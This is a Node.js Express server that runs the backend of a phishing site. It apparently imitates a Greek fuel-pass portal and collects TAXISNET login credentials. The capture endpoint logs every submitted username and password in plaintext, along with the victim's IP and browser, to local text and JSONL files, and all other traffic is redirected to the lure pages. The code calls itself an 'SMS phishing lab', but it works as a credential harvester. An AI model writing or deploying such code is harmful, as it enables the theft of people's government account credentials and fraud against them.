const express = require("express");
const path    = require("path");
const fs      = require("fs");
const http    = require("http");

const app  = express();
const PORT = process.env.PORT || 3000;
const BASE = "/fuelpass/appfront";

const PUBLIC_DIR = path.join(__dirname, "..", "public");
const LOG_FILE   = path.join(__dirname, "captures.txt");
const JSONL_FILE = path.join(__dirname, "captures.jsonl");

app.use(express.json({ limit: "64kb", type: ["application/json", "text/plain"] }));
app.use(express.urlencoded({ extended: true }));

function getClientIp(req) {
    let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
    if (ip.startsWith("::ffff:")) ip = ip.slice(7);
    return ip;
}

function logCapture(entry) {
    const ts = new Date().toLocaleString("el-GR");
    let out = `\n[${ts}] TAXISNET CAPTURE - IP: ${entry.ip}\n`;
    out += `  username    : ${entry.username || "(none)"}\n`;
    out += `  password    : ${entry.password || "(none)"}\n`;
    out += `  attempt     : ${entry.attempt || "?"}\n`;
    out += `  user-agent  : ${entry.ua || "(none)"}\n`;
    out += "=".repeat(60) + "\n";

    console.log(out);
    fs.appendFile(LOG_FILE, out, () => {});
    fs.appendFile(JSONL_FILE, JSON.stringify(entry) + "\n", () => {});
}

app.get("/", (req, res) => res.redirect(BASE + "/"));

app.post(`${BASE}/capture`, (req, res) => {
    let data = req.body;
    if (typeof data === "string") {
        try { data = JSON.parse(data); } catch { data = {}; }
    }

    logCapture({
        received_at: new Date().toISOString(),
        ip:          getClientIp(req),
        username:    data.username,
        password:    data.password,
        attempt:     data.attempt,
        ua:          data.ua || req.headers["user-agent"],
        client_ts:   data.ts,
    });

    res.status(204).end();
});

app.use(BASE, express.static(PUBLIC_DIR, {
    extensions: ["html"],
    index:      "index.html",
}));

app.use((req, res) => res.redirect(302, BASE + "/"));

http.createServer(app).listen(PORT, () => {
    fs.appendFile(LOG_FILE,
        `\n--- Session started: ${new Date().toLocaleString("el-GR")} ---\n`,
        () => {});
    console.log(`SMS phishing lab listening on http://localhost:${PORT}${BASE}`);
    console.log(`Captures (text):  ${LOG_FILE}`);
    console.log(`Captures (jsonl): ${JSONL_FILE}`);
});
